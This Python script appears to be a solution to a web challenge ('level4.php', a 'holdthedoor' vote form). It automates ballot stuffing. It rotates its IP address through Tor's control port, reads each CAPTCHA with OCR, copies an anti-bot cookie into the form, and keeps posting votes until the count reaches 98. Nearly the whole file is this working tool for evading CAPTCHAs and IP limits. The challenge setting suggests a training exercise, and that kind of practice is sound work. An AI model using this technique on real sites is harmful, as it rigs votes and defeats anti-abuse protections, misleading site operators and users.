import requests
import time
import shutil
import stem
try:
    import Image
except ImportError:
    from PIL import Image
import pytesseract


session = requests.session()
# Tor uses the 9050 port as the default socks port
session.proxies = {'http':  'socks5://127.0.0.1:9050',
                   'https': 'socks5://127.0.0.1:9050'}
header =  {'Content-Type': 'application/x-www-form-urlencoded',
           'Referer': 'http://54.221.6.249/level4.php',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'

}
URL = 'http://54.221.6.249/level4.php'
payload = {
    'id': '81',
    'holdthedoor': 'Submit',
    'key': '0',
    'captcha': '0'
}

def newip():
    from stem import Signal
    from stem.control import Controller

    with Controller.from_port(port = 9051) as controller:
        controller.authenticate(password='16:4C15EA523D2ED85A60CD166EB43F37D10369253ADC837332769CDD5395')
        controller.signal(Signal.NEWNYM)
        time.sleep(controller.get_newnym_wait())

def captcha(cookies):
    r = session.get('http://54.221.6.249/captcha.php', cookies=cookies, stream=True)
    if r.status_code == 200:
        with open('./file', 'wb') as f:
            r.raw.decode_content = True
            shutil.copyfileobj(r.raw, f)
    im = Image.open('file')
    im = im.convert("RGBA")
    im.save('temp2.jpg')
    return(pytesseract.image_to_string(Image.open('temp2.jpg')))

r = session.get(URL)
while "81    </td>\n    <td>\n98" not in r.text:
    newip()
    print(r.text)
    cookies = r.cookies
    payload['captcha'] = str(captcha(cookies))
    payload['key'] = cookies['HoldTheDoor']
    r = session.post(URL, data=payload, headers=header, cookies=cookies)
    r = session.get(URL)
print("Voting complete!")
